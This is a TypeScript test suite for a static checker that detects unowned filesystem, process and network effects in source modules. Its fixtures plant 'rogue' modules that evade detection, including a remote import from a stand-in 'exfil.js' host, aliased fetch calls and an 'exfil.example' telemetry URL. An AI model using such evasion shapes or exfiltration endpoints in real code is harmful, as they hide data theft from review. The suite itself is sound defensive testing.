import { describe, it, expect, afterAll } from 'vitest';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative, resolve } from 'node:path';
import {
  auditEffectOwnership,
  runEffectLedgerCensus,
  detectModuleEffects,
  extractImports,
  extractImportSpecifiers,
  maskNonCode,
  packageNameOf,
  classifySpecifier,
  scanEffectOccurrences,
  scanEffectTree,
  ruleClaims,
  isScannableFile,
  EFFECT_OWNERSHIP,
  EXCLUDED_DIRS,
  GOVERNED_SOURCE_ROOT,
  INERT_DEPENDENCIES,
  type EffectLedgerDiagnostic,
  type EffectOccurrence,
  type EffectOwnershipRule,
  type EffectScan,
  type ModuleLexer,
} from '../../../src/architecture/effect-ledger.js';
import { lexModule } from '../../../tools/test-helpers/module-lexer.js';
import { adversarialInput } from '../../../tools/test-helpers/adversarial-lexer-inputs.js';
import {
  supersededExtractImports,
  supersededMaskNonCode,
} from '../../../tools/test-helpers/superseded-source-lexer.js';
import { listTrackedFiles, trackedFilesMissedBy } from '../../../tools/test-helpers/tracked-population.js';
import { rmrfAsync } from '../../../tools/test-helpers/temp-dir.js';

const SRC_ROOT = join(dirname(fileURLToPath(import.meta.url)), '../../../src');
/** The repository root — `src/` is one level down from it. */
const REPO_ROOT = join(SRC_ROOT, '..');

/**
 * The second authority for the module count of this census.
 * It lists the files that git tracks in the scope of the scanner.
 * That scope uses the same {@link EXCLUDED_DIRS} and {@link isScannableFile}.
 * Both sides describe one population, so a shortfall is a broken walk.
 * A fixed floor far below the real count stays green when the walk loses part of the tree.
 */
async function trackedScannableModules(): Promise<string[]> {
  return listTrackedFiles(SRC_ROOT, {
    exclude: (path) => {
      const segments = path.split('/');
      const name = segments[segments.length - 1] ?? '';
      return segments.slice(0, -1).some((dir) => EXCLUDED_DIRS.has(dir)) || !isScannableFile(name);
    },
  });
}

/** Wraps an occurrence list in a scan with healthy counts, so a verdict test exercises only the ownership checks. */
const scanOf = (occurrences: readonly EffectOccurrence[]): EffectScan => ({
  occurrences,
  moduleCount: 1,
  specifierCount: 1,
});

describe('detectModuleEffects', () => {
  it('classifies fs / process / network imports', () => {
    const occ = detectModuleEffects(
      'x/y.ts',
      `import { readFile } from 'node:fs/promises';
       import { execFile } from 'node:child_process';
       import net from 'node:net';`, lexModule,
    );
    const classes = occ.map((o) => o.effectClass).sort();
    expect(classes).toEqual(['filesystem', 'network', 'process']);
  });

  it('detects a global fetch as a network effect', () => {
    const occ = detectModuleEffects('x/y.ts', `export async function f() { return fetch('http://x'); }`, lexModule);
    expect(occ.map((o) => o.effectClass)).toContain('network');
  });

  it('does NOT classify a specifier that only appears in a comment or string', () => {
    const occ = detectModuleEffects(
      'x/y.ts',
      `// import { x } from 'node:fs';\nconst s = "from 'node:child_process'"; export const y = 1;`, lexModule,
    );
    expect(occ).toHaveLength(0);
  });

  it('dedupes multiple fs imports into one filesystem occurrence', () => {
    const occ = detectModuleEffects(
      'x/y.ts',
      `import { readFile } from 'node:fs/promises';\nimport { existsSync } from 'node:fs';`, lexModule,
    );
    expect(occ.filter((o) => o.effectClass === 'filesystem')).toHaveLength(1);
  });
});

describe('runEffectLedgerCensus — verdict logic', () => {
  const rules: EffectOwnershipRule[] = [
    { effectClass: 'process', match: 'vcs/', owner: 'vcs', idempotency: 'i', compensation: 'c' },
  ];

  it('flags an occurrence no rule claims as INDETERMINATE_OWNER', () => {
    const occ: EffectOccurrence[] = [
      { module: 'vcs/shell.ts', effectClass: 'process', evidence: 'node:child_process' },
      { module: 'mystery/rogue.ts', effectClass: 'process', evidence: 'node:child_process' },
    ];
    const result = runEffectLedgerCensus(scanOf(occ), rules);
    expect(result.ok).toBe(false);
    const codes = result.diagnostics.map((d) => d.code);
    expect(codes).toContain('INDETERMINATE_OWNER');
    const indeterminate = result.diagnostics.find((d) => d.code === 'INDETERMINATE_OWNER');
    expect(indeterminate && 'module' in indeterminate && indeterminate.module).toBe('mystery/rogue.ts');
  });

  it('flags a rule that claims nothing as STALE_OWNERSHIP', () => {
    const result = runEffectLedgerCensus(scanOf([]), rules);
    expect(result.diagnostics.map((d) => d.code)).toContain('STALE_OWNERSHIP');
  });

  it('passes when every occurrence is claimed and every rule claims something', () => {
    const occ: EffectOccurrence[] = [
      { module: 'vcs/shell.ts', effectClass: 'process', evidence: 'node:child_process' },
    ];
    expect(runEffectLedgerCensus(scanOf(occ), rules).ok).toBe(true);
  });
});

describe('ruleClaims', () => {
  it('prefix rule matches by directory; exact rule matches the module only', () => {
    const prefix: EffectOwnershipRule = { effectClass: 'filesystem', match: 'storage/', owner: 'o', idempotency: 'i', compensation: 'c' };
    const exact: EffectOwnershipRule = { effectClass: 'network', match: 'workflow/feedback.ts', owner: 'o', idempotency: 'i', compensation: 'c' };
    expect(ruleClaims(prefix, { module: 'storage/db.ts', effectClass: 'filesystem', evidence: 'fs' })).toBe(true);
    expect(ruleClaims(prefix, { module: 'storaged/db.ts', effectClass: 'filesystem', evidence: 'fs' })).toBe(false);
    expect(ruleClaims(exact, { module: 'workflow/feedback.ts', effectClass: 'network', evidence: 'fetch' })).toBe(true);
    expect(ruleClaims(exact, { module: 'workflow/other.ts', effectClass: 'network', evidence: 'fetch' })).toBe(false);
  });
});

describe('EXIT PROOF — live effect ledger', () => {
  /** The diagnostics assertion comes first, so a failure prints each diagnostic. */
  it('(a) the live shipped source has ZERO indeterminate owners and no stale cover', async () => {
    const result = await auditEffectOwnership(SRC_ROOT, lexModule);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
    expect(result.occurrenceCount).toBeGreaterThan(0);
  });

  it('(b) a planted unowned effect FAILS the census against the live rules', async () => {
    const scan = await scanEffectTree(SRC_ROOT, lexModule);
    const planted: EffectOccurrence = {
      module: 'channel/rogue-emitter.ts',
      effectClass: 'filesystem',
      evidence: 'node:fs',
    };
    const result = runEffectLedgerCensus(
      { ...scan, occurrences: [...scan.occurrences, planted] },
      EFFECT_OWNERSHIP,
    );
    expect(result.ok).toBe(false);
    expect(
      result.diagnostics.some(
        (d) => d.code === 'INDETERMINATE_OWNER' && 'module' in d && d.module === 'channel/rogue-emitter.ts',
      ),
    ).toBe(true);
  });
});

describe('isScannableFile', () => {
  it('accepts shipped .ts and rejects test/decl/bench files', () => {
    expect(isScannableFile('emitter.ts')).toBe(true);
    expect(isScannableFile('emitter.test.ts')).toBe(false);
    expect(isScannableFile('types.d.ts')).toBe(false);
    expect(isScannableFile('x.bench.ts')).toBe(false);
  });
});

/**
 * The owner module of each planted tree, so no fixture reports `STALE_OWNERSHIP`.
 * Its source imports `zod`, which is on the inert allowlist, so each tree has a specifier count above zero.
 * Without that import, the smallest trees fail with `EMPTY_SPECIFIER_DENOMINATOR`.
 */
const OWNER_MODULE = 'owner/network-client.ts';
const OWNER_SOURCE = `
import { z } from 'zod';
export const Url = z.string();
export async function post(url: string, body: string): Promise<boolean> {
  const response = await fetch(url, { method: 'POST', body });
  return response.ok;
}
`;
const SCOPED_RULES: readonly EffectOwnershipRule[] = Object.freeze([
  {
    effectClass: 'network',
    match: OWNER_MODULE,
    owner: 'test-network-owner',
    idempotency: 'i',
    compensation: 'c',
  } as const,
]);

/** Writes each `{ relativePath: source }` entry into a new temporary source root. */
async function plantTree(files: Record<string, string>): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'effect-ledger-dr13-'));
  for (const [rel, source] of Object.entries(files)) {
    const abs = join(root, rel);
    await mkdir(dirname(abs), { recursive: true });
    await writeFile(abs, source, 'utf8');
  }
  return root;
}

function indeterminateOf(
  diagnostics: readonly EffectLedgerDiagnostic[],
): Extract<EffectLedgerDiagnostic, { code: 'INDETERMINATE_OWNER' }>[] {
  return diagnostics.filter(
    (d): d is Extract<EffectLedgerDiagnostic, { code: 'INDETERMINATE_OWNER' }> =>
      d.code === 'INDETERMINATE_OWNER',
  );
}

/**
 * The fail-closed tests plant real `.ts` files in a temporary tree and run `auditEffectOwnership` end to end.
 * A hand-built occurrence array proves only the census, and the subject here is the detector.
 * When the detector misses an import shape, the census stays green over a tree that does network I/O.
 */
describe('DR-13 kill — the widened detector sees evaded network clients', () => {
  const roots: string[] = [];
  const plant = async (files: Record<string, string>): Promise<string> => {
    const root = await plantTree(files);
    roots.push(root);
    return root;
  };

  afterAll(async () => {
    await Promise.all(roots.map((r) => rmrfAsync(r)));
  });

  it('CONTROL — an owner-only tree is GREEN (so redness below is caused by the plant)', async () => {
    const root = await plant({ [OWNER_MODULE]: OWNER_SOURCE });
    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  /**
   * The plants hold two named clients, a network builtin, an unknown package and a remote-URL import.
   * A curated list cannot name the unknown package, so only the closed-world fallback charges it.
   * The evidence names a known client by its specifier and an unknown package as `unvetted-dependency:<package>`.
   * Thus the named-client rule and the fallback each have an expectation of their own.
   * Only the plants make the tree red: each diagnostic is `INDETERMINATE_OWNER`.
   */
  it('EffectLedger_SeededNonListedHttpClient_CensusFailsClosed', async () => {
    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'rogue/axios-client.ts': `
        import axios from 'axios';
        export const get = async (url: string): Promise<unknown> => (await axios.get(url)).data;
      `,
      'rogue/got-client.ts': `
        import got from 'got';
        export const head = async (url: string): Promise<number> => (await got.head(url)).statusCode;
      `,
      'rogue/http2-client.ts': `
        import { connect } from 'node:http2';
        export const open = (authority: string) => connect(authority);
      `,
      'rogue/private-transport.ts': `
        import { post } from '@acme/secret-transport';
        export const send = (url: string, body: string) => post(url, body);
      `,
      'rogue/url-import.ts': `
        import { ship } from 'https://cdn.example.test/exfil.js';
        export const send = (body: string) => ship(body);
      `,
    });

    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);

    expect(result.ok).toBe(false);
    const bad = indeterminateOf(result.diagnostics);
    expect(bad.map((d) => d.module).sort()).toEqual([
      'rogue/axios-client.ts',
      'rogue/got-client.ts',
      'rogue/http2-client.ts',
      'rogue/private-transport.ts',
      'rogue/url-import.ts',
    ]);
    for (const diagnostic of bad) {
      expect(diagnostic.effectClass).toBe('network');
      expect(diagnostic.message).toContain(diagnostic.module);
    }
    expect(result.diagnostics.every((d) => d.code === 'INDETERMINATE_OWNER')).toBe(true);

    const evidence = new Map(bad.map((d) => [d.module, d.evidence]));
    expect(evidence.get('rogue/axios-client.ts')).toBe('axios');
    expect(evidence.get('rogue/got-client.ts')).toBe('got');
    expect(evidence.get('rogue/http2-client.ts')).toBe('node:http2');
    expect(evidence.get('rogue/private-transport.ts')).toBe(
      'unvetted-dependency:@acme/secret-transport',
    );
    expect(evidence.get('rogue/url-import.ts')).toBe('https://cdn.example.test/exfil.js');
  });

  /**
   * No plant calls `fetch` as a bare function. Each one reaches the network through an alias, a global root or a constructor.
   * The evidence names the rule that matched each shape, so the removal of one rule fails a named expectation.
   */
  it('EffectLedger_AliasedFetchGlobal_CensusFailsClosed', async () => {
    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'rogue/alias.ts': `
        const send = fetch;
        export const go = (url: string): Promise<Response> => send(url);
      `,
      'rogue/bound-alias.ts': `
        const send = fetch.bind(globalThis);
        export const go = (url: string): Promise<Response> => send(url);
      `,
      'rogue/global-member.ts': `
        export const go = (url: string): Promise<Response> => globalThis.fetch(url);
      `,
      'rogue/destructured.ts': `
        const { fetch: send } = globalThis;
        export const go = (url: string): Promise<Response> => send(url);
      `,
      'rogue/socket.ts': `
        export const open = (url: string): WebSocket => new WebSocket(url);
      `,
    });

    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);

    expect(result.ok).toBe(false);
    const bad = indeterminateOf(result.diagnostics);
    expect(bad.map((d) => d.module).sort()).toEqual([
      'rogue/alias.ts',
      'rogue/bound-alias.ts',
      'rogue/destructured.ts',
      'rogue/global-member.ts',
      'rogue/socket.ts',
    ]);
    const evidence = new Map(bad.map((d) => [d.module, d.evidence]));
    expect(evidence.get('rogue/alias.ts')).toBe('fetch (aliased binding)');
    expect(evidence.get('rogue/bound-alias.ts')).toBe('fetch (aliased binding)');
    expect(evidence.get('rogue/global-member.ts')).toBe('globalThis.fetch');
    expect(evidence.get('rogue/destructured.ts')).toBe('fetch (destructured from globalThis)');
    expect(evidence.get('rogue/socket.ts')).toBe('new WebSocket');
  });

  /**
   * A re-export names the primitive, so the module that re-exports it is the effect site.
   * The scan does not charge the consumer of the re-export, because attribution is per module and never transitive.
   */
  it('EffectLedger_ReExportOfEffectPrimitive_IsDetectedAtTheReExporter', async () => {
    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'rogue/primitives.ts': `export { request } from 'node:https';`,
      'quiet/consumer.ts': `
        import { request } from '../rogue/primitives.js';
        export const go = (url: string): unknown => request(url);
      `,
    });

    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);

    const bad = indeterminateOf(result.diagnostics);
    expect(bad.map((d) => d.module)).toEqual(['rogue/primitives.ts']);
    expect(bad[0]?.evidence).toBe('node:https');
    expect(bad.some((d) => d.module === 'quiet/consumer.ts')).toBe(false);
  });

  /**
   * Each snippet except the last two has the shape of a shipped module that names a client or a primitive but performs no effect.
   * The token sits in a regex literal, a string, a raw template, a comment or a longer identifier such as `fetchPrData`.
   * The last two snippets hold inert imports and type-only imports of network builtins.
   * No snippet yields an occurrence alone, and a planted tree of all of them with a real owner stays green.
   */
  it('EffectLedger_IncidentalTokensFromLiveTreeShapes_YieldNoOccurrence', async () => {
    const incidental: Record<string, string> = {
      'config/toolchains.ts': `
        const signature = {
          depClass: 'third-party-http',
          test: /^(axios|node-fetch|got|undici|superagent|ky|request|phin)(\\/|$)/i,
        };
        export const classify = (s: string): boolean => signature.test.test(s);
      `,
      'workflow/admission/remediation-purity.ts': `
        export const FORBIDDEN_IMPORT_MARKERS: readonly string[] = Object.freeze([
          'node:fs', 'node:child_process', 'node:net', 'node:http', 'node:https',
          'node:dgram', 'node:tls', 'undici',
        ]);
      `,
      'review/check-catalog.ts': `
        export const check = {
          description: 'fetch() calls without timeout can hang indefinitely',
          pattern: String.raw\`fetch\\(\`,
          falsePositives: 'Test stubs or mock fetch calls that make no real request.',
        };
      `,
      'architecture/adapter-ownership-seam.ts': `
        export const note =
          'All network I/O (http/https/net/tls/dgram/undici/fetch) is owned by the feedback client.';
      `,
      'verbs/vcs/validate-pr-body.ts': `
        function fetchPrData(pr: number): number { return pr; }
        async function getOrFetchRoots(): Promise<number> { return 1; }
        export const data = fetchPrData(1) + (await getOrFetchRoots());
      `,
      'contract/oracle/fixtures.ts': `
        export const record = (ctx: { effects: { record: (a: string, b: string) => void } }): void =>
          ctx.effects.record('network', 'fetch:https://exfil.example/telemetry');
      `,
      'verbs/gates/mock-boundary.ts': `
        // BARE package specifiers ('axios', '@scope/pkg') are returned verbatim.
        /* e.g. import axios from 'axios'; or import { connect } from 'node:http2'; */
        export const verbatim = true;
      `,
      'inert/dependencies.ts': `
        import { z } from 'zod';
        import matter from 'gray-matter';
        import { Command } from 'commander';
        import { Database } from 'bun:sqlite';
        import util from 'util';
        import { parse } from 'yaml';
        export const all = [z, matter, Command, Database, util, parse];
      `,
      'types/only.ts': `
        import type { Server } from 'node:http';
        export type { Socket } from 'node:net';
        export type Handle = Server | null;
      `,
    };

    for (const [module, source] of Object.entries(incidental)) {
      expect(detectModuleEffects(module, source, lexModule), `${module} must yield no occurrence`).toEqual([]);
    }

    const root = await plant({ ...incidental, [OWNER_MODULE]: OWNER_SOURCE });
    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  /**
   * Pins the type-only guard alone, so no other expectation of the false-positive sweep can hide a regression.
   * The value form of the same specifier stays an effect site.
   * A `type` modifier in one statement does not apply to the next statement.
   */
  it('EffectLedger_TypeOnlyNetworkImport_YieldsNoOccurrence', async () => {
    expect(detectModuleEffects('x/y.ts', `import type { Server } from 'node:http2';`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/y.ts', `export type { Socket } from 'node:net';`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/y.ts', `import type Axios from 'axios';`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/y.ts', `import { connect } from 'node:http2';`, lexModule)).toEqual([
      { module: 'x/y.ts', effectClass: 'network', evidence: 'node:http2' },
    ]);
    const mixed = `export type Foo = number;\nimport got from 'got';`;
    expect(detectModuleEffects('x/y.ts', mixed, lexModule).map((o) => o.evidence)).toEqual(['got']);

    const root = await plant({
      [OWNER_MODULE]: OWNER_SOURCE,
      'types/net.ts': `
        import type { Http2Session } from 'node:http2';
        export type Session = Http2Session | null;
      `,
    });
    const result = await auditEffectOwnership(root, lexModule, SCOPED_RULES);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  /**
   * A quote inside a regex literal is not a string delimiter.
   * A lexer without regex awareness opens a phantom string there and then reads comment prose as code.
   * In that lexer, the apostrophe in the comment closes the phantom string, and `from 'axios'` scans as a live import.
   * The comment must stay on the same line as the regex.
   * A newline ends a phantom `'` or `"` string, so a fixture with the comment on the next line passes with no regex awareness.
   *
   * A regex after `return` must also lex as a regex, and a regex body must be masked.
   * Without that mask, the ledger module matches its own `fetch` detection rules.
   * A `/` in division position must not open a regex, because that hides real code.
   */
  it('EffectLedger_RegexLiteralWithQuoteChars_DoesNotDesyncTheLexer', () => {
    const sameLine = [
      "const RE = /(['\"])x\\1/; // don't ship: import axios from 'axios';",
      'export const after = 1;',
    ].join('\n');
    expect(extractImports(sameLine, lexModule)).toEqual([]);
    expect(detectModuleEffects('architecture/detector.ts', sameLine, lexModule)).toEqual([]);

    const blindSpot = [
      `export function isQuote(x: string): boolean { return /(['"])/.test(x); }`,
      `// historical: import axios from 'axios';`,
      `import { connect } from 'node:http2';`,
    ].join('\n');
    expect(extractImports(blindSpot, lexModule).map((r) => r.specifier)).toEqual(['node:http2']);
    expect(detectModuleEffects('x/y.ts', blindSpot, lexModule).map((o) => o.evidence)).toEqual(['node:http2']);

    const blockSameLine =
      "const RE = /(['\"`])x\\1/; /* was: import axios from 'axios' */ export const a = 1;";
    expect(detectModuleEffects('architecture/detector.ts', blockSameLine, lexModule)).toEqual([]);

    const selfShape = [
      'const AMBIENT = [',
      '  { re: /(?<![\\w$.])fetch\\s*\\(/, evidence: "fetch" },',
      '  { re: /=\\s*fetch(?![\\w$])/, evidence: "alias" },',
      '];',
      'export const rules = AMBIENT;',
    ].join('\n');
    expect(maskNonCode(selfShape, lexModule)).not.toContain('fetch');
    expect(detectModuleEffects('architecture/effect-ledger.ts', selfShape, lexModule)).toEqual([]);

    const division = `const ratio = total / count;\nimport { connect } from 'node:http2';`;
    expect(detectModuleEffects('x/y.ts', division, lexModule).map((o) => o.evidence)).toEqual(['node:http2']);
  });

  /**
   * Pins two deliberate false negatives: an injected client and a computed global access.
   * A per-module scan cannot decide either one.
   * No rule matches a bare `fetch` identifier, so a property key and an interface member with that name stay inert.
   */
  it('EffectLedger_DocumentedTrustBoundary_InjectedClientAndComputedAccess', () => {
    const injected = `
      export interface HttpLike { readonly post: (url: string, body: string) => Promise<boolean>; }
      export class Reporter {
        constructor(private readonly http: HttpLike) {}
        async report(url: string, body: string): Promise<boolean> {
          return this.http.post(url, body);
        }
      }
    `;
    expect(detectModuleEffects('x/reporter.ts', injected, lexModule)).toEqual([]);

    const computed = `
      const g = globalThis as unknown as Record<string, (u: string) => Promise<unknown>>;
      const key = 'fet' + 'ch';
      export const go = (url: string): Promise<unknown> => (g[key] as (u: string) => Promise<unknown>)(url);
    `;
    expect(detectModuleEffects('x/computed.ts', computed, lexModule)).toEqual([]);

    expect(detectModuleEffects('x/keys.ts', `export const c = { fetch: 1, post: 2 };`, lexModule)).toEqual([]);
    expect(
      detectModuleEffects('x/iface.ts', `export interface Deps { fetch: (u: string) => void }`, lexModule),
    ).toEqual([]);
  });

  /**
   * `global`, `self` and `window` reach the same ambient network surface as `globalThis`.
   * The rule anchors on the left, so a longer identifier that ends in one of these names does not match.
   */
  it('EffectLedger_AmbientGlobalAliases_GlobalSelfWindow_AreNetworkEffects', () => {
    for (const root of ['globalThis', 'global', 'self', 'window']) {
      const occ = detectModuleEffects(
        'x/alias.ts',
        `export const go = (u: string) => ${root}.fetch(u);`, lexModule,
      );
      expect(occ.map((o) => o.effectClass), `${root}.fetch must be a network effect`).toEqual([
        'network',
      ]);
    }
    expect(detectModuleEffects('x/n1.ts', `export const x = notglobal.fetch('u');`, lexModule)).toEqual([]);
  });

  /**
   * The ambient `Bun` object does I/O with no import: it opens sockets, spawns a process and reads or writes files.
   * Each rule needs the `Bun` member shape, so `myBun.serve` and a name in a comment or a string stay inert.
   */
  it('EffectLedger_BunAmbientAPIs_AreDetected_PerEffectClass', () => {
    const cases: readonly [source: string, effectClass: string, evidence: string][] = [
      [`export const s = Bun.serve({ port: 3000, fetch: () => new Response('x') });`, 'network', 'Bun.serve'],
      [`export const c = await Bun.connect({ hostname: 'x', port: 1 });`, 'network', 'Bun.serve'],
      [`export const p = Bun.spawn(['ls']);`, 'process', 'Bun.spawn'],
      [`export const ok = await Bun.write('/tmp/x', 'data');`, 'filesystem', 'Bun.write'],
      [`export const f = Bun.file('/tmp/x');`, 'filesystem', 'Bun.write'],
    ];
    for (const [source, effectClass, evidence] of cases) {
      const occ = detectModuleEffects('x/bun.ts', source, lexModule);
      expect(occ, `${source} must be detected`).toEqual([
        { module: 'x/bun.ts', effectClass, evidence },
      ]);
    }
    expect(detectModuleEffects('x/nb1.ts', `export const x = myBun.serve(1);`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/nb2.ts', `// docs: Bun.serve is the ambient server`, lexModule)).toEqual([]);
    expect(detectModuleEffects('x/nb3.ts', `export const s = 'Bun.spawn(cmd)';`, lexModule)).toEqual([]);
  });

  /**
   * One allowlist entry covers each subpath of its package, so `@modelcontextprotocol/server/stdio` is inert.
   * `@modelcontextprotocol/sdk` has no entry, so its subpath is an unvetted dependency.
   * A node builtin without the `node:` prefix is a builtin and not an unvetted package, and `bun:sqlite` stays inert.
   * Each allowlist entry must classify as inert.
   */
  it('EffectLedger_ClosedWorldAllowlist_IsPerPackageNotPerSubpath', () => {
    expect(packageNameOf('@modelcontextprotocol/server/stdio')).toBe(
      '@modelcontextprotocol/server',
    );
    expect(packageNameOf('gray-matter')).toBe('gray-matter');
    expect(packageNameOf('yaml/dist/x.js')).toBe('yaml');

    expect(classifySpecifier('@modelcontextprotocol/server/stdio')).toBeUndefined();
    expect(classifySpecifier('@modelcontextprotocol/sdk/types.js')).toEqual({
      effectClass: 'network',
      evidence: 'unvetted-dependency:@modelcontextprotocol/sdk',
    });
    expect(classifySpecifier('@acme/anything/deep/path.js')).toEqual({
      effectClass: 'network',
      evidence: 'unvetted-dependency:@acme/anything',
    });
    expect(classifySpecifier('util')).toBeUndefined();
    expect(classifySpecifier('child_process')).toEqual({
      effectClass: 'process',
      evidence: 'child_process',
    });
    expect(classifySpecifier('bun:sqlite')).toBeUndefined();
    for (const pkg of INERT_DEPENDENCIES) {
      expect(classifySpecifier(pkg), `${pkg} is allowlisted so must classify inert`).toBeUndefined();
    }
  });
});

describe('DR-13 live tree — the widened census is green and load-bearing', () => {
  it('EffectLedger_LiveShippedSource_IsGreenUnderTheWidenedDetector', async () => {
    const result = await auditEffectOwnership(SRC_ROOT, lexModule);
    expect(result.diagnostics).toEqual([]);
    expect(result.ok).toBe(true);
  });

  /**
   * A rule that claims no site must fail the census over the real tree.
   * The stale rule is the only diagnostic, which also shows that the tree is green without it.
   */
  it('EffectLedger_LiveDeclaredOwnerWithNoLiveSite_TripsStaleOwnership', async () => {
    const phantom: EffectOwnershipRule = {
      effectClass: 'network',
      match: 'nowhere/phantom-client.ts',
      owner: 'phantom-owner',
      idempotency: 'i',
      compensation: 'c',
    };
    const result = await auditEffectOwnership(SRC_ROOT, lexModule, [...EFFECT_OWNERSHIP, phantom]);
    expect(result.ok).toBe(false);
    expect(result.diagnostics).toEqual([
      expect.objectContaining({
        code: 'STALE_OWNERSHIP',
        match: 'nowhere/phantom-client.ts',
        owner: 'phantom-owner',
      }),
    ]);
  });

  /**
   * A bare package that the shipped tree imports must not be an unvetted dependency.
   * The walk has the scope of the scanner ({@link EXCLUDED_DIRS}, {@link isScannableFile}), so it reads no harness file.
   * The walk must reach each tracked module in that scope, or the finding covers an incomplete tree.
   */
  it('EffectLedger_LiveBareImportSurface_IsFullyCoveredByTheInertAllowlist', async () => {
    const { readdir, readFile } = await import('node:fs/promises');
    const files: string[] = [];
    const walk = async (dir: string): Promise<void> => {
      for (const entry of await readdir(dir, { withFileTypes: true })) {
        if (entry.isDirectory()) {
          if (EXCLUDED_DIRS.has(entry.name)) continue;
          await walk(join(dir, entry.name));
        } else if (entry.isFile() && isScannableFile(entry.name)) {
          files.push(join(dir, entry.name));
        }
      }
    };
    await walk(SRC_ROOT);
    expect(
      trackedFilesMissedBy(
        files.map((file) => relative(SRC_ROOT, file).replaceAll('\\', '/')),
        await trackedScannableModules(),
      ),
      'the bare-import sweep did not reach every tracked module in its scope — ' +
        'the unvetted-dependency finding below ranges over an incomplete tree',
    ).toEqual([]);

    const unvetted = new Set<string>();
    for (const file of files) {
      for (const ref of extractImports(await readFile(file, 'utf8'), lexModule)) {
        const hit = classifySpecifier(ref.specifier);
        if (hit !== undefined && hit.evidence.startsWith('unvetted-dependency:')) {
          unvetted.add(`${hit.evidence} (${file})`);
        }
      }
    }
    expect([...unvetted]).toEqual([]);
  });
});

/**
 * This lexer assembles the two retired heuristic walks of `tools/test-helpers/superseded-source-lexer.ts` into a {@link ModuleLexer}.
 * Its only use is to measure the gap between the retired walks and the parser-based `lexModule`.
 * The tests run both lexers over the same input and assert both answers.
 * The helper does not export an assembled lexer, and a real census must not use this one.
 */
const SUPERSEDED_LEXER: ModuleLexer = (source: string) => ({
  imports: supersededExtractImports(source),
  maskedSource: supersededMaskNonCode(source),
});

/**
 * The expectations of this census for the shared inputs in `tools/test-helpers/adversarial-lexer-inputs.ts`.
 * Only the inputs are shared. The two answer columns belong to this site, because each retired walk answers differently.
 * The test asserts `parse` and `heuristic` for each row, so the test fails when a row with different answers gets equal answers.
 */
interface AdversarialExpectation {
  readonly name: string;
  readonly parse: readonly string[];
  readonly heuristic: readonly string[];
}

const ADVERSARIAL_EXPECTATIONS: readonly AdversarialExpectation[] = Object.freeze([
  {
    name: 'a `//` comment opener inside a string literal',
    parse: ['node:fs'],
    heuristic: ['node:fs'],
  },
  {
    name: 'an unbalanced `/* */` pair split across two template literals',
    parse: ['node:fs'],
    heuristic: ['node:fs'],
  },
  {
    name: "a regex literal containing a ' quote, in operand position",
    parse: ['node:fs'],
    heuristic: ['node:fs'],
  },
  {
    /**
     * The false negative. After `return`, the heuristic reads the `/` as division.
     * The backtick in the regex then opens a phantom template, which is not line-bounded.
     * That template runs to the end of the file and hides the real `node:fs` import.
     */
    name: 'a regex literal containing a BACKTICK, in operand position',
    parse: ['node:fs'],
    heuristic: [],
  },
  {
    /**
     * The false positive. The heuristic toggles on each backtick, so it reads the text of the nested template as code.
     * The module imports nothing, and the heuristic reports `node:child_process`.
     */
    name: 'a nested template literal inside a `${…}` substitution',
    parse: [],
    heuristic: ['node:child_process'],
  },
]);

const ADVERSARIAL_SET: readonly {
  readonly name: string;
  readonly source: string;
  readonly parse: readonly string[];
  readonly heuristic: readonly string[];
}[] = Object.freeze(
  ADVERSARIAL_EXPECTATIONS.map((row) => ({ ...row, source: adversarialInput(row.name) })),
);

describe('DR-26 kill fixture — where the heuristic and a real parse disagree', () => {
  /**
   * The last assertion names the rows on which the two lexers differ.
   * A table with no such row proves nothing about the port.
   */
  it('EffectLedger_AdversarialSet_ParseAndHeuristicAnswersAreBothPinned', () => {
    const disagreeing: string[] = [];
    for (const row of ADVERSARIAL_SET) {
      const parsed = extractImports(row.source, lexModule).map((r) => r.specifier);
      const heuristic = extractImports(row.source, SUPERSEDED_LEXER).map((r) => r.specifier);
      expect(parsed, `${row.name} — parse`).toEqual([...row.parse]);
      expect(heuristic, `${row.name} — heuristic`).toEqual([...row.heuristic]);
      if (JSON.stringify(parsed) !== JSON.stringify(heuristic)) disagreeing.push(row.name);
    }
    expect(disagreeing).toEqual([
      'a regex literal containing a BACKTICK, in operand position',
      'a nested template literal inside a `${…}` substitution',
    ]);
  });

  /** The false negative: the module imports `node:fs`, and the detector with the retired lexer reports no effect. */
  it('EffectLedger_RegexHoldingABacktick_HidesARealFilesystemImportFromTheHeuristic', () => {
    const source = [
      'export function isTick(s: string): boolean { return /`/.test(s); }',
      "import { readFile } from 'node:fs';",
      'export const read = readFile;',
    ].join('\n');

    expect(extractImports(source, SUPERSEDED_LEXER).map((r) => r.specifier)).toEqual([]);
    expect(extractImports(source, lexModule).map((r) => r.specifier)).toEqual(['node:fs']);

    expect(detectModuleEffects('rogue/hidden-fs.ts', source, SUPERSEDED_LEXER)).toEqual([]);
    expect(detectModuleEffects('rogue/hidden-fs.ts', source, lexModule)).toEqual([
      { module: 'rogue/hidden-fs.ts', effectClass: 'filesystem', evidence: 'node:fs' },
    ]);
  });

  /** The false positive: the module imports nothing, and the detector with the retired lexer reports a process effect. */
  it('EffectLedger_NestedTemplateSubstitution_MakesTheHeuristicInventAnEffect', () => {
    const source =
      'export const doc = `outer ${ `inner from \'node:child_process\' text` } end`;';

    expect(extractImports(source, SUPERSEDED_LEXER).map((r) => r.specifier)).toEqual([
      'node:child_process',
    ]);
    expect(extractImports(source, lexModule).map((r) => r.specifier)).toEqual([]);

